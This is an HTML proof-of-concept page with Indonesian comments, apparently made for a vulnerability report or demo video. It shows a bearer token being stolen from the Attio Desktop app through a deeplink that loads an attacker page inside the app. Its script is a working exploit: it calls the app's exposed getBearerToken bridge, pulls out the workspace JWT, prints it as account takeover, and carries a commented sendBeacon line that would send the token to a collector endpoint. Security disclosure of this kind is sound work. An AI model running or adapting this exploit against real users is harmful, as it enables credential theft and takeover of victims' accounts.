
<!doctype html><meta charset=utf-8><title>Attio</title>
<body style="font:20px/1.6 ui-monospace,SFMono-Regular,Menlo,monospace;background:#0b0b0f;color:#e6e6e6;padding:5vw;margin:0">
<h1 style="color:#ff5470;font-size:32px;margin:0 0 20px;font-family:-apple-system,system-ui">Attio Desktop — bearer token dicuri via deeplink</h1>
<div style="font-family:-apple-system,system-ui;color:#aaa">Halaman attacker ini dimuat KE DALAM Attio lewat deeplink <b style="color:#7ab8ff">attio:http://…</b></div>
<div style="margin-top:12px;font-family:-apple-system,system-ui">location.origin = <b id=og style="color:#fbbf24"></b> <span style="color:#777">← origin ATTACKER, bukan app.attio.com</span></div>
<pre id=o style="margin-top:28px;font-size:20px;white-space:pre-wrap;word-break:break-all"></pre>
<script>
// Tampilkan token utuh? false = prefix…suffix + panjang (lebih aman untuk video). true = tampil penuh (bukti maksimal).
const SHOW_FULL = false;
og.textContent = location.origin;
const o = document.getElementById('o');
(async () => {
  let s = 'window.attioDesktop = ' + (typeof window.attioDesktop) + '\n\n';
  try {
    const r = await window.attioDesktop.auth.getBearerToken();   // { state, value:{ bearerToken, expiresAtTimestamp } }
    // >>> Di serangan nyata attacker meng-exfil di sini:
    //     navigator.sendBeacon('http://127.0.0.1:8899/collect', r.value.bearerToken);
    let tok = '';
    const walk = x => { if (typeof x === 'string' && x.length > 200) tok = x; else if (x && typeof x === 'object') for (const k in x) walk(x[k]); };
    walk(r);
    if (tok.length > 100) {
      const shown = SHOW_FULL ? tok : (tok.slice(0, 40) + '  …  ' + tok.slice(-24));
      s += 'getBearerToken() → WORKSPACE BEARER JWT (len=' + tok.length + '):\n\n' + shown +
           '\n\n>>> ACCOUNT TAKEOVER — token ini memanggil Attio API sebagai korban <<<';
      o.style.color = '#4ade80';
    } else {
      s += 'Tidak ada token di store. Pastikan Attio sudah login, lalu ulangi.';
      o.style.color = '#fbbf24';
    }
  } catch (e) { s += 'error: ' + (e && e.message); o.style.color = '#fbbf24'; }
  o.textContent = s;
})();
</script>
